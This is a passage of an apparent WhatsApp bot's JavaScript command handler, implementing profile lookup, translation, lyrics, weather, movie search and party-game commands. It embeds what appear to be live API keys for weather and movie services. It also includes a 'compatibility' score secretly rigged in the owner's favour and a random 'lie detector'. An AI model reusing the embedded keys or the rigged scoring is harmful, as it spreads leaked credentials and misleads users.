                     sender;

        // 2. VERIFY USER EXISTS
        const [user] = await conn.onWhatsApp(userJid).catch(() => []);
        if (!user?.exists) return reply("❌ User not found on WhatsApp");

        // 3. GET PROFILE PICTURE
        let ppUrl;
        try {
            ppUrl = await conn.profilePictureUrl(userJid, 'image');
        } catch {
            ppUrl = 'https://i.ibb.co/KhYC4FY/1221bc0bdd2354b42b293317ff2adbcf-icon.png';
        }

        // 4. GET NAME (MULTI-SOURCE FALLBACK)
        let userName = userJid.split('@')[0];
        try {
            // Try group participant info first
            if (isGroup) {
                const member = participants.find(p => p.id === userJid);
                if (member?.notify) userName = member.notify;
            }
            
            // Try contact DB
            if (userName === userJid.split('@')[0] && conn.contactDB) {
                const contact = await conn.contactDB.get(userJid).catch(() => null);
                if (contact?.name) userName = contact.name;
            }
            
            // Try presence as final fallback
            if (userName === userJid.split('@')[0]) {
                const presence = await conn.presenceSubscribe(userJid).catch(() => null);
                if (presence?.pushname) userName = presence.pushname;
            }
        } catch (e) {
            console.log("Name fetch error:", e);
        }

        // 5. GET BIO/ABOUT
        let bio = {};
        try {
            // Try personal status
            const statusData = await conn.fetchStatus(userJid).catch(() => null);
            if (statusData?.status) {
                bio = {
                    text: statusData.status,
                    type: "Personal",
                    updated: statusData.setAt ? new Date(statusData.setAt * 1000) : null
                };
            } else {
                // Try business profile
                const businessProfile = await conn.getBusinessProfile(userJid).catch(() => null);
                if (businessProfile?.description) {
                    bio = {
                        text: businessProfile.description,
                        type: "Business",
                        updated: null
                    };
                }
            }
        } catch (e) {
            console.log("Bio fetch error:", e);
        }

        // 6. GET GROUP ROLE
        let groupRole = "";
        if (isGroup) {
            const participant = participants.find(p => p.id === userJid);
            groupRole = participant?.admin ? "👑 Admin" : "👥 Member";
        }

        // 7. FORMAT OUTPUT
        const formattedBio = bio.text ? 
            `${bio.text}\n└─ 📌 ${bio.type} Bio${bio.updated ? ` | 🕒 ${bio.updated.toLocaleString()}` : ''}` : 
            "No bio available";

        const userInfo = `
*GC MEMBER INFORMATION 🧊*

📛 *Name:* ${userName}
🔢 *Number:* ${userJid.replace(/@.+/, '')}
📌 *Account Type:* ${user.isBusiness ? "💼 Business" : user.isEnterprise ? "🏢 Enterprise" : "👤 Personal"}

*📝 About:*
${formattedBio}

*⚙️ Account Info:*
✅ Registered: ${user.isUser ? "Yes" : "No"}
🛡️ Verified: ${user.verifiedName ? "✅ Verified" : "❌ Not verified"}
${isGroup ? `👥 *Group Role:* ${groupRole}` : ''}
`.trim();

        // 8. SEND RESULT
        await conn.sendMessage(from, {
            image: { url: ppUrl },
            caption: userInfo,
            mentions: [userJid]
        }, { quoted: mek });

    } catch (e) {
        console.error("Person command error:", e);
        reply(`❌ Error: ${e.message || "Failed to fetch profile"}`);
    }
}
break
case "trt": 
case "translate": {
if (!text) {
            return reply(`🌍 *Translate to English*\n\nUsage: ${prefix}translate <text>\n\nExamples:\n• ${prefix}translate Hola\n• ${prefix}translate Bonjour\n• ${prefix}translate 你好`);
        }

        try {
            // React immediately
            await conn.sendMessage(m.chat, {
                react: { text: "🌍", key: m.key }
            });

            const apiUrl = `https://api.popcat.xyz/v2/translate?to=en&text=${encodeURIComponent(text)}`;
            const res = await fetch(apiUrl, { timeout: 10000 });
            const data = await res.json();

            // Check for errors
            if (data.error === true) {
                return reply(`❌ Translation failed: ${data.message || 'Unknown error'}`);
            }

            
            let translated = data.message?.translated;
            
            // If translated is still an object, try to extract string
            if (translated && typeof translated === 'object') {
                translated = translated.text || translated.translated || JSON.stringify(translated);
            }
            
            // Validate we have a string
            if (!translated || typeof translated !== 'string') {
                return reply(`❌ Translation failed. Could not extract translation from response.`);
            }

            // Clean and format
            await conn.sendMessage(m.chat, {
                text: `*TRANSLATION*\n\n🗣️ *Original:* ${text}\n\n*Translatd:* ${translated}\n\n`
            }, { quoted: m });

        } catch (error) {
            console.error('Translate error:', error);
            
            if (error.message.includes('timeout')) {
                reply('⏰ Translation timeout. Try shorter text.');
            } else {
                reply('❌ Translation failed. Try again.');
            }
        }
}
break
case "tovideo": {
 if (!m.quoted) return reply(`Reply to a sticker with caption *${prefix + command}*`);
    if (!m.quoted.mimetype.includes('webp')) return reply(`Please reply to a webp sticker`);
    
    try {
      const media = await m.quoted.download();
      const videoUrl = await webp2mp4(media);
      
      if (!videoUrl) throw new Error('Conversion failed');
      
      await conn.sendFile(m.chat, videoUrl, 'converted.mp4', '', m);
      
    } catch (error) {
      console.error(error);
      reply('❌ Failed to convert sticker to video. Please try again later.');
    }
}

break
case "toimage": {
const quoted = m.quoted || m.msg?.quoted;
    const mime = quoted?.mimetype || quoted?.msg?.mimetype;
    if (!quoted || !/webp/.test(mime)) {
      return reply(`*Send or reply to a sticker with the caption ${prefix + command}*`);
    }

    try {
      const media = await quoted.download();
      const inputPath = path.join(__dirname, getRandom('.webp'));
      fs.writeFileSync(inputPath, media);
      const outputPath = path.join(__dirname, getRandom('.png'));
      exec(`ffmpeg -i ${inputPath} ${outputPath}`, (err) => {
        fs.unlinkSync(inputPath); 

        if (err) {
          console.error('Error converting to image:', err);
          return reply('An error occurred while converting the sticker to an image.');
        }
        const buffer = fs.readFileSync(outputPath);
        conn.sendMessage(m.chat, { image: buffer }, { quoted: m });    
        fs.unlinkSync(outputPath);
      });
    } catch (error) {
      console.error('Error converting to image:', error);
      reply('An error occurred while converting the sticker to an image.');
    }
}
break
case 'lyrics': {
      if (!text) {
            return reply(`🎵 *Lyrics Finder*\n\nUsage: ${prefix}lyrics <song name>\n\nExamples:\n• ${prefix}lyrics shape of you\n• ${prefix}lyrics Sekkle down by bunnie Gunter\n• ${prefix}lyrics Blinding Lights The Weeknd`);
        }

        try {
            await reply(`🔍 Searching lyrics for: *"${text}"*...`);

            let lyricsData;
            let success = false;

            // Try primary API first (popcat)
            try {
                const apiUrl = `https://api.popcat.xyz/v2/lyrics?song=${encodeURIComponent(text)}`;
                const res = await fetch(apiUrl, { timeout: 15000 });
                
                if (!res.ok) throw new Error(`API status: ${res.status}`);
                
                const data = await res.json();

                if (data.error !== true && data.message && typeof data.message === 'object' && data.message.lyrics) {
                    lyricsData = data.message;
                    success = true;
                } else {
                    throw new Error('Primary API returned no lyrics');
                }
            } catch (primaryError) {
                console.log('Primary API failed, trying fallback API...');
                
                // Fallback to new API
                const fallbackUrl = `https://api.nexray.eu.cc/search/lyrics?q=${encodeURIComponent(text)}`;
                const fallbackRes = await fetch(fallbackUrl);
                const fallbackData = await fallbackRes.json();
                
                if (fallbackData.status && fallbackData.result && fallbackData.result.lyrics) {
                    lyricsData = {
                        title: fallbackData.result.title,
                        artist: fallbackData.result.artist,
                        lyrics: fallbackData.result.lyrics.plain_lyrics || fallbackData.result.lyrics.synced_lyrics,
                        image: fallbackData.result.thumbnail
                    };
                    success = true;
                } else {
                    throw new Error('Fallback API also failed');
                }
            }

            if (!success || !lyricsData) {
                return reply(`No lyrics found for *"${text}"*\n\nTry:\n• Add artist name\n• Check spelling\n• Use exact title`);
            }

            const lyrics = lyricsData.lyrics;
            const artist = lyricsData.artist || 'Unknown';
            const title = lyricsData.title || text;
            const image = lyricsData.image;

            // Clean up lyrics (remove "Contributor" line if present)
            const cleanLyrics = lyrics.replace(/^\d+\s+Contributor.*?\n/i, '');

            // Format message (max 4000 chars for WhatsApp)
            let message = `🎵 *${title}*\n🎤 *Artist:* ${artist}\n\n📖 *Lyrics:*\n\n${cleanLyrics}`;
            
            if (message.length > 3500) {
                message = message.substring(0, 3500) + '\n\n*Lyrics truncated - song too long*';
            }
            
            message += `\n\n${global.wm || ''}`;

            // Send image first if available
            if (image && typeof image === 'string' && image.includes('http') && !image.includes('default_cover_image')) {
                try {
                    await conn.sendMessage(m.chat, {
                        image: { url: image },
                        caption: `🎵 *${title}*\n🎤 *Artist:* ${artist}`
                    }, { quoted: m });
                    
                    // Small delay
                    await new Promise(resolve => setTimeout(resolve, 300));
                } catch (e) {
                    console.log('Image failed:', e.message);
                }
            }

            // Send lyrics
            await conn.sendMessage(m.chat, { text: message }, { quoted: m });

        } catch (error) {
            console.error('Lyrics error:', error);
            
            let errMsg = `Error: ${error.message}`;
            if (error.message.includes('timeout')) errMsg = 'Request timed out';
            if (error.message.includes('network')) errMsg = 'Network error';
            if (error.message.includes('status: 5')) errMsg = 'Service unavailable';
            
            reply(`${errMsg}\n\nTry again in a few moments!`);
        }
}
break
case 'playstore': { 
const query = args.join(" ");   
    if (!query) {
        return reply("*Please provide an app name to search. Example: !playstore whatsapp*");
    }
    
    try {
        const apiUrl = `https://api.princetechn.com/api/search/playstore?apikey=${global.princetechn || 'prince'}&query=${encodeURIComponent(query)}`;
        const { data } = await axios.get(apiUrl, { timeout: 10000 });
        
        if (data && data.success && data.results && data.results.length > 0) {
            const app = data.results[0];
            const resultText = `Name: ${app.name}\nDeveloper: ${app.developer}\nApp ID: ${app.appId}\nRating: ${app.rating}\nSummary: ${app.summary}\nLink: ${app.link}\nDeveloper Link: ${app.link_dev}`;
            reply(resultText);
        } else {
            reply(`No apps found for "${query}".`);
        }
    } catch (error) {
        console.error('Playstore error:', error.message);
        reply("Error searching Play Store. Please try again later!");
    }
    
}
break
case "yts": 
case "ytsearch": {
    if (!text) return reply(`📌 *Example: ${prefix + command} Eminem Godzilla*`);

      try {
        const searchResults = await yts(text);
        if (!searchResults.all.length) return reply("❌ *No YouTube results found.*");

        let responseText = `🎥 *YouTube Search Results for:* ${text}\n\n`;
        searchResults.all.slice(0, 10).forEach((video, index) => {
          responseText += `□ *${index + 1}.* ${video.title}\n□ *Uploaded:* ${video.ago}\n□ *Views:* ${video.views}\n□ *Duration:* ${video.timestamp}\n□ *URL:* ${video.url}\n\n─────────────────\n\n`;
        });

        await conn.sendMessage(
          m.chat,
          { image: { url: searchResults.all[0].thumbnail }, caption: responseText },
          { quoted: m }
        );
      } catch (error) {
        console.error("YT Search command failed:", error);
        reply("❌ *An error occurred while fetching YouTube search results.*");
      }
}
break
case 'ytplay':
case 'ytmp3':
case 'ytaudio': {
    await ytplayCommand(conn, m.chat, text, m);
   
}
break
case 'song': {
      if (!text) return reply('*Please provide a song name!*');

    try {
      const search = await yts(text);
      if (!search || search.all.length === 0) return reply('*The song you are looking for was not found.*');

      const video = search.all[0];
      const downloadUrl = await fetchMp3DownloadUrl(video.url);

      await conn.sendMessage(m.chat, {
        audio: { url: downloadUrl },
        mimetype: 'audio/mpeg',
        fileName: `${video.title}.mp3`
      }, { quoted: m });

    } catch (error) {
      console.error('play command failed:', error);
      reply(`Error: ${error.message}`);
    }
  }
break
case "imdb":
case "movie": {
if (!text) return reply("Provide a movie or series name.");
      
      try {
        const { data } = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`);
        if (data.Response === "False") throw new Error();

        const imdbText = `🎬 *IMDB SEARCH*\n\n`
          + `*Title:* ${data.Title}\n*Year:* ${data.Year}\n*Rated:* ${data.Rated}\n`
          + `*Released:* ${data.Released}\n*Runtime:* ${data.Runtime}\n*Genre:* ${data.Genre}\n`
          + `*Director:* ${data.Director}\n*Actors:* ${data.Actors}\n*Plot:* ${data.Plot}\n`
          + `*IMDB Rating:* ${data.imdbRating} ⭐\n*Votes:* ${data.imdbVotes}`;

        conn.sendMessage(m.chat, { image: { url: data.Poster }, caption: imdbText }, { quoted: m });
      } catch (error) {
        reply("❌ Unable to fetch IMDb data.");
      }
}
break
case 'define': {
    const term = args.join(' ');
    
    if (!term) {
        return reply("*Please provide a word to define. Example: !define dog*");
    }
    
    try {
        const apiUrl = `https://api.princetechn.com/api/tools/define?apikey=${global.princetechn || 'prince'}&term=${encodeURIComponent(term)}`;
        const { data } = await axios.get(apiUrl, { timeout: 10000 });
        
        if (data && data.success && data.results && data.results.length > 0) {
            const firstResult = data.results[0];
            const resultText = `Word: ${firstResult.word}\n\nDefinition: ${firstResult.definition}\n\nExample: ${firstResult.example}`;
            reply(resultText);
        } else {
            reply(`No definition found for "${term}".`);
        }
    } catch (error) {
        console.error('Define error:', error.message);
        reply("Error fetching definition. Please try again later!");
    }
    
}
break
case "weather": {
if (!text) return reply("Provide a location.");

      try {
        const { data } = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273`);
        
        const weatherInfo = `🌤️ *Weather for ${text}*\n\n`
          + `🌡️ *Temperature:* ${data.main.temp}°C (Feels like ${data.main.feels_like}°C)\n`
          + `🌪️ *Weather:* ${data.weather[0].main} - ${data.weather[0].description}\n`
          + `💨 *Wind Speed:* ${data.wind.speed} m/s\n`
          + `📍 *Coordinates:* ${data.coord.lat}, ${data.coord.lon}\n`
          + `🌍 *Country:* ${data.sys.country}`;

        conn.sendMessage(m.chat, { text: weatherInfo }, { quoted: m });
      } catch (error) {
        reply("❌ Unable to fetch weather data.");
      }
}
break
case "shazam": {
 const quoted = m.quoted ? m.quoted : null || m.msg ;
 const mime = quoted?.mimetype || ""; 
      if (!quoted || !/audio|video/.test(mime)) return reply("Reply to an audio or video to identify music.");
      
try {
    const media = await m.quoted.download();
    const filePath = `./tmp/${m.sender}.${mime.split('/')[1]}`;
    fs.writeFileSync(filePath, media);
    const res = await acr.identify(fs.readFileSync(filePath));
    if (res.status.code != 0) throw new Error(res.status.msg);

    //  this check before accessing music[0]
    if (!res.metadata?.music || res.metadata.music.length === 0) {
        return reply("No music identified in this audio/video.");
    }

    const { title, artists, album, release_date } = res.metadata.music[0];
    const resultText = `  *Music Identified!*\n\n*Title:* ${title}\n*Artist(s):* ${artists.map(v => v.name).join(', ')}\n*Album:* ${album?.name || 'Unknown'}\n*Release Date:* ${release_date || 'Unknown'}`;
    
    reply(resultText);
} catch (error) {
    console.error(error);
    reply("Error identifying music: " + error.message);
      }
}
break
case "instagramuser":
case "iguser": {
const username = args[0];
        
        if (!username) return reply("*Please provide an Instagram username. Example: `.iguser siputzx_*`");
        
        try {
            await reply(`🔍 Searching for @${username}...`);
            
            const response = await fetch(`${global.mess.siputzx}/api/d/igram?url=${encodeURIComponent(username)}`);
            const data = await response.json();
            
            if (!data.status || !data.data?.result?.length) {
                return reply(`❌ User "@${username}" not found.`);
            }
            
            const user = data.data.result[0].user;
            
            let message = `*📸 INSTAGRAM PROFILE*\n\n`;
            message += `👤 *Username:* @${user.username}\n`;
            message += `📛 *Name:* ${user.full_name || 'Not set'}\n`;
            message += `📝 *Bio:* ${user.biography || 'No bio'}\n`;
            message += `🔗 *Website:* ${user.external_url || 'None'}\n\n`;
            message += `👥 *Followers:* ${user.follower_count?.toLocaleString() || 0}\n`;
            message += `👣 *Following:* ${user.following_count?.toLocaleString() || 0}\n`;
            message += `📹 *Posts:* ${user.media_count?.toLocaleString() || 0}\n`;
            message += `🔒 *Private:* ${user.is_private ? 'Yes' : 'No'}\n`;
            message += `✅ *Verified:* ${user.is_verified ? 'Yes' : 'No'}\n\n`;
            
            if (user.profile_pic_url) {
                await conn.sendMessage(m.chat, {
                    image: { url: user.profile_pic_url },
                    caption: message
                }, { quoted: m });
            } else {
                reply(message);
            }
            
            await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
            
        } catch (error) {
            console.error('Instagram user error:', error);
            reply("❌ Error fetching Instagram profile. Try again later.");
            await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        }
}
break
case 'chord':
case 'cr': {
  if(!text) return m.reply(`*query input*`);
  let anu = `https://api.diioffc.web.id/api/search/chord?query=${encodeURIComponent(text)}`;
  const res = await fetch(anu)
  const response = await res.json();
  m.reply(`Url: ${response.result.url}\nArtis: ${response.result.artist}\nArtisUrl: ${response.result.artistUrl}\nJudul: ${response.result.title}\nChord: ${response.result.chord}`), { quoted: m };
}
break
case "dares":
case "dare": {

    await dareCommand(conn, from, m);
    
}
break
case "truth": {

    await truthCommand(conn, from, m);
    
}
break
case "truthdetecter": {
   if (!m.quoted) return reply(`Please reply to the message you want to detect!`);

    let responses = [
      "That's a blatant lie!",
      "Truth revealed!",
      "Lie alert!",
      "Hard to believe, but true!",
      "Professional liar detected!",
      "Fact-check: TRUE",
      "Busted! That's a lie!",
      "Unbelievable, but FALSE!",
      "Detecting... TRUTH!",
      "Lie detector activated: FALSE!",
      "Surprisingly, TRUE!",
      "My instincts say... LIE!",
      "That's partially true!",
      "Can't verify, try again!",
      "Most likely, TRUE!",
      "Don't believe you!",
      "Surprisingly, FALSE!",
      "Truth!",
      "Honest as a saint!",
      "Deceptive much?",
      "Absolutely true!",
      "Completely false!",
      "Seems truthful.",
      "Not buying it!",
      "You're lying through your teeth!",
      "Hard to believe, but it's true!",
      "I sense honesty.",
      "Falsehood detected!",
      "Totally legit!",
      "Lies, lies, lies!",
      "You can't fool me!",
      "Screams truth!",
      "Fabrication alert!",
      "Spot on!",
      "Fishy story, isn't it?",
      "Unquestionably true!",
      "Pure fiction!"
    ];

    let result = responses[Math.floor(Math.random() * responses.length)];
    let replyText = `*RESULT*: ${result}`;

    await reply(replyText);
}
break
case "fact": {
    try {
      const { data } = await axios.get(`https://nekos.life/api/v2/fact`);
      return reply(`*FACT:* ${data.fact}\n`);
    } catch (err) {
      console.error(err);
      return reply('*An error occurred while fetching the fact.*');
    }
}
break
case "truth": {
const truths = [
      "What's your biggest fear?",
      "Have you ever lied to your best friend?",
      "What's your deepest secret?",
      "Who's your secret crush?",
      "What's the biggest mistake you've ever made?",
      "Have you ever cheated on a test?",
      "What's the most embarrassing thing that's ever happened to you?",
      "Do you have a hidden talent?",
      "What's the biggest lie you've ever told?",
      "Have you ever been in love?",
      "What's the most spontaneous thing you've ever done?",
      "Who's the person you trust most?",
      "What's the biggest risk you've ever taken?",
      "Have you ever regretted something?",
      "What's the most memorable gift you've received?",
      "Have you ever had a crush on someone older?",
      "What's the biggest lesson you've learned?",
      "Have you ever broken someone's heart?",
      "What's the most exciting thing you've done?",
      "Do you believe in soulmates?",
      "What's the biggest challenge you've faced?",
      "Have you ever kept a secret from your parents?",
      "What's the most creative thing you've done?",
      "Have you ever felt betrayed?",
      "What's the biggest adventure you've been on?",
      "Have you ever had a rival?",
      "What's the most thoughtful thing someone's done for you?",
      "Have you ever forgiven someone?",
      "What's the biggest obstacle you've overcome?",
      "Do you believe in karma?",
      "What's the most romantic thing someone's done for you?",
      "Have you ever taken a risk for love?",
      "What's the biggest surprise you've ever received?",
      "Have you ever had a paranormal experience?",
      "What's the most inspiring story you've heard?",
      "Have you ever helped someone in need?",
      "What's the biggest accomplishment you're proud of?",
    ];

    const truthMessage = truths[Math.floor(Math.random() * truths.length)];
    const buffer = await getBuffer('https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg');

    await conn.sendMessage(
      from,
      {
        image: buffer,
        caption: `*TRUTH*\n${truthMessage}`,
      },
      { quoted: m }
     );
        
}
break
case 'guesscartoon':
case 'cartoonquiz':
case 'guesscharacter':
    try {
        await m.reply("🎮 Fetching a cartoon character...");
        
        const response = await fetch(`${global.mess.siputzx}/api/games/tebakkartun`);
        const data = await response.json();
        
        if (!data.status || !data.data) {
            return m.reply("*Failed to fetch cartoon character.*");
        }
        
        await conn.sendMessage(m.chat, {
            image: { url: data.data.img },
            caption: `🎪 *GUESS THE CARTOON CHARACTER!*\n\nCan you name this character?\n\nReply with your answer!`
        }, { quoted: m });
        
    } catch (error) {
        console.error('Game error:', error);
        m.reply("❌ Error fetching cartoon game.");
    }
  
break
case "compatibility":
case "comp": {
    try {
        // Check if two users are mentioned
        if (!m.mentionedJid || m.mentionedJid.length < 2) {
            return reply("Please mention two users to calculate compatibility.\nUsage: `.compatibility @user1 @user2`");
        }

        const [user1, user2] = m.mentionedJid.slice(0, 2);
        
        // Calculate random compatibility score (1-1000)
        let compatibilityScore = Math.floor(Math.random() * 1000) + 1;

        // Special case for bot owner (replace '256742932677' with your actual owner number)
        const ownerNumber = "256742932677@s.whatsapp.net";
        if (user1 === ownerNumber || user2 === ownerNumber) {
            compatibilityScore = 1000;
        }

        // Format the response
        const resultMessage = 
            `💖 *Compatibility Result* 💖\n\n` +
            `@${user1.split('@')[0]} ❤️ @${user2.split('@')[0]}\n` +
            `Score: ${compatibilityScore}/1000\n\n` +
            `${getCompatibilityMessage(compatibilityScore)}`;

        // Send the result
        await conn.sendMessage(
            m.chat,
            { 
                text: resultMessage,
                mentions: [user1, user2]
            },
            { quoted: m }
        );

    } catch (error) {
        console.error('Error in compatibility command:', error);
        reply(`❌ Error: ${error.message}`);
    }
    break;
}

// Helper function to get a fun message based on score
function getCompatibilityMessage(score) {
    if (score >= 900) return "Soulmates! 💞 You're perfect for each other!";
    if (score >= 700) return "Great match! 💕 You complement each other well.";
    if (score >= 500) return "Good potential! 💗 With some work, this could be great.";
    if (score >= 300) return "Not bad! 💖 There's some chemistry here.";
    return "Might need some work... 💔 But don't give up!";
}
break
case "compliment": {
let compliments = [
        "You're amazing just the way you are! 💖",
        "You light up every room you walk into! 🌟",
        "Your smile is contagious! 😊",
        "You're a genius in your own way! 🧠",
        "You bring happiness to everyone around you! 🥰",
        "You're like a human sunshine! ☀️",
        "Your kindness makes the world a better place! ❤️",
        "You're unique and irreplaceable! ✨",
        "You're a great listener and a wonderful friend! 🤗",
        "Your positive vibes are truly inspiring! 💫",
        "You're stronger than you think! 💪",
        "Your creativity is beyond amazing! 🎨",
        "You make life more fun and interesting! 🎉",
        "Your energy is uplifting to everyone around you! 🔥",
        "You're a true leader, even if you don’t realize it! 🏆",
        "Your words have the power to make people smile! 😊",
        "You're so talented, and the world needs your skills! 🎭",
        "You're a walking masterpiece of awesomeness! 🎨",
        "You're proof that kindness still exists in the world! 💕",
        "You make even the hardest days feel a little brighter! ☀️"
    ];

    let randomCompliment = compliments[Math.floor(Math.random() * compliments.length)];
    let sender = `@${mek.sender.split("@")[0]}`;
    let mentionedUser = m.mentionedJid[0] || (mek.quoted && mek.quoted.sender);
    let target = mentionedUser ? `@${mentionedUser.split("@")[0]}` : "";

    let message = mentionedUser 
        ? `${sender} complimented ${target}:\n😊 *${randomCompliment}*`
        : `${sender}, you forgot to tag someone! But hey, here's a compliment for you:\n😊 *${randomCompliment}*`;

    await conn.sendMessage(mek.chat, { text: message, mentions: [mek.sender, mentionedUser].filter(Boolean) }, { quoted: mek });
}
break
case "8balls": {
    if (!q) return reply("🎱 Ask a yes/no question!\nExample: .8ball Will I be rich?");
    
    const responses = [
        "Yes, definitely! 🎯",
        "No way! ❌",
        "Ask again later. ⏳",
        "It is certain. ✅",
        "Very doubtful. 🤔",
        "Without a doubt. 💯",
        "My reply is no. 🚫",
        "Signs point to yes. ✨",
        "Maybe... 😐",
        "Absolutely! 🔥"
    ];
    
    const answer = responses[Math.floor(Math.random() * responses.length)];
    const text = `🎱 *Magic 8-Ball*\n\n❓ *Question:* ${q}\n\n💬 *Answer:* ${answer}`;
    
    // Use buttonHandler
    if (buttonHandler && typeof buttonHandler.send === 'function') {
        await buttonHandler.send(m.chat, {
            title: '🎱 MAGIC 8-BALL',
            text: text,
            footer: 'Tap button to ask again',
            buttons: [
                { text: '🔄 Ask Again', id: `8ball_${Date.now()}` }
            ]
        }, m, async (msg, selectedId) => {
            // Ask again button clicked - get new answer
            const newAnswer = responses[Math.floor(Math.random() * responses.length)];
            const newText = `🎱 *Magic 8-Ball*\n\n❓ *Question:* ${q}\n\n💬 *Answer:* ${newAnswer}`;
            
            await buttonHandler.send(m.chat, {
                title: '🎱 MAGIC 8-BALL',
                text: newText,
                footer: 'Tap button to ask again',
                buttons: [
                    { text: '🔄 Ask Again', id: `8ball_${Date.now()}` }
                ]
            }, msg, async () => {});
            
            await conn.sendMessage(m.chat, { react: { text: '✅', key: msg.key } });
        });
    } else {
        // Fallback if buttonHandler not available
        reply(text);
    }
    
    
}
break
case "lovetest": {
if (args.length < 2) return reply("Tag two users! Example: .lovetest @user1 @user2");

    let user1 = args[0].replace("@", "") + "@s.whatsapp.net";
    let user2 = args[1].replace("@", "") + "@s.whatsapp.net";

    let lovePercent = Math.floor(Math.random() * 100) + 1; // Generates a number between 1-100

    let messages = [
        { range: [90, 100], text: "💖 *A match made in heaven!* True love exists!" },
        { range: [75, 89], text: "😍 *Strong connection!* This love is deep and meaningful." },
        { range: [50, 74], text: "😊 *Good compatibility!* You both can make it work." },
        { range: [30, 49], text: "🤔 *It’s complicated!* Needs effort, but possible!" },
        { range: [10, 29], text: "😅 *Not the best match!* Maybe try being just friends?" },
        { range: [1, 9], text: "💔 *Uh-oh!* This love is as real as a Bollywood breakup!" }
    ];

    let loveMessage = messages.find(msg => lovePercent >= msg.range[0] && lovePercent <= msg.range[1]).text;

    let message = `💘 *Love Compatibility Test* 💘\n\n❤️ *@${user1.split("@")[0]}* + *@${user2.split("@")[0]}* = *${lovePercent}%*\n${loveMessage}`;

    await conn.sendMessage(mek.chat, { text: message, mentions: [user1, user2] }, { quoted: mek });
}
break
case "emoji": {
try {
            // Join the words together in case the user enters multiple words
            let text = args.join(" ");
            
            // Map text to corresponding emoji characters
            let emojiMapping = {
                "a": "🅰️",
                "b": "🅱️",
                "c": "🇨️",
                "d": "🇩️",
                "e": "🇪️",
                "f": "🇫️",
                "g": "🇬️",
                "h": "🇭️",
                "i": "🇮️",
                "j": "🇯️",
                "k": "🇰️",
                "l": "🇱️",
                "m": "🇲️",
                "n": "🇳️",
                "o": "🅾️",
                "p": "🇵️",
                "q": "🇶️",
                "r": "🇷️",
                "s": "🇸️",
                "t": "🇹️",
                "u": "🇺️",
                "v": "🇻️",
                "w": "🇼️",
                "x": "🇽️",
                "y": "🇾️",
                "z": "🇿️",
                "0": "0️⃣",
                "1": "1️⃣",
                "2": "2️⃣",
                "3": "3️⃣",
                "4": "4️⃣",
                "5": "5️⃣",
                "6": "6️⃣",
                "7": "7️⃣",
                "8": "8️⃣",
                "9": "9️⃣",
                " ": "␣", // for space
            };

            // Convert the input text into emoji form
            let emojiText = text.toLowerCase().split("").map(char => emojiMapping[char] || char).join("");

            // If no valid text is provided
            if (!text) {
                return reply("Please provide some text to convert into emojis!");
            }

            await conn.sendMessage(mek.chat, {
                text: emojiText,
            }, { quoted: mek });

        } catch (error) {
            console.log(error);
            reply(`Error: ${error.message}`);
        }
}
break
case "emojimix":
case "mixemoji":
case "emix": {
    if (!text) return reply(`🎨 *EMOJI MIXER*\n\nMix two emojis to create a new one!\n\n*Usage:*\n${prefix}emojimix 🥺 🤔\n${prefix}emix 😂 🥲\n${prefix}emojimix 🔥 💀\n\n*Example:*\n${prefix}emojimix 🥺 🤔`);

    // Extract two emojis from text
    const emojiRegex = /[\p{Emoji}\uFE0F\u20E3]/gu;
    const emojis = text.match(emojiRegex);
    
    if (!emojis || emojis.length < 2) {
        return reply(`❌ *Please provide TWO emojis!*\n\nExample: ${prefix}emojimix 😂 🥲`);
    }

    const emoji1 = emojis[0];
    const emoji2 = emojis[1];

    await reply(`🔍 *Mixing ${emoji1} + ${emoji2}...*`);
    await conn.sendMessage(m.chat, { react: { text: "🎨", key: m.key } });

    try {
        const apiUrl = `https://api.nexray.eu.cc/tools/emojimix?emoji1=${encodeURIComponent(emoji1)}&emoji2=${encodeURIComponent(emoji2)}`;
        const response = await axios.get(apiUrl, {
            responseType: 'arraybuffer',
            timeout: 15000
        });

        // Check if response is an image
        const contentType = response.headers['content-type'];
        if (contentType && contentType.includes('image')) {
            await conn.sendMessage(m.chat, {
                image: Buffer.from(response.data),
                caption: `🎨 *Emoji Mix Result*\n\n${emoji1} + ${emoji2} = ?`
            }, { quoted: m });
            await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        } else {
            throw new Error('Invalid response from API');
        }

    } catch (error) {
        console.error('Emojimix error:', error);
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        reply(`❌ *Failed to mix emojis.*\n\nPlease try different emojis or try again later.`);
    }
    
}
break
case "emojigif":
case "egif":
case "emojitogif": {
    if (!text) return reply(`🎨 *EMOJI TO GIF*\n\nConvert an emoji to an animated GIF!\n\n*Usage:*\n${prefix}emojigif 😂\n${prefix}egif 🥺\n${prefix}emojitogif 🔥\n\n*Example:*\n${prefix}emojigif 🤣`);

    // Extract emoji from text
    const emojiRegex = /[\p{Emoji}\uFE0F\u20E3]/gu;
    const emojis = text.match(emojiRegex);
    
    if (!emojis || emojis.length === 0) {
        return reply(`*Please provide an emoji!*\n\nExample: ${prefix}emojigif 😂`);
    }

    const emoji = emojis[0];

    await reply(`*Converting ${emoji} to GIF...*`);
    await conn.sendMessage(m.chat, { react: { text: "🎨", key: m.key } });

    try {
        const apiUrl = `https://api.nexray.eu.cc/tools/emojigif?emoji=${encodeURIComponent(emoji)}`;
        const response = await axios.get(apiUrl, {
            responseType: 'arraybuffer',
            timeout: 15000
        });

        const contentType = response.headers['content-type'];
        if (contentType && contentType.includes('image/gif')) {
            await conn.sendMessage(m.chat, {
                video: Buffer.from(response.data), // GIF as video
                caption: `> ${global.wm}`,
                gifPlayback: true,
                mimetype: 'video/mp4'
            }, { quoted: m });
            await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        } else {
            await conn.sendMessage(m.chat, {
                image: Buffer.from(response.data),
                caption: `> ${global.wm}`
            }, { quoted: m });
            await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        }

    } catch (error) {
        console.error('Emoji GIF error:', error);
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        reply(`❌ *Failed to convert emoji to GIF.*\n\nPlease try a different emoji or try again later.`);
    }
    
}
break
case "removebg":
case "removebackground":
case "rmbg": {
    const quoted = m.quoted || m.msg?.quoted;
    const mime = quoted?.mimetype || quoted?.msg?.mimetype;

    if (!quoted || !/image/.test(mime)) {
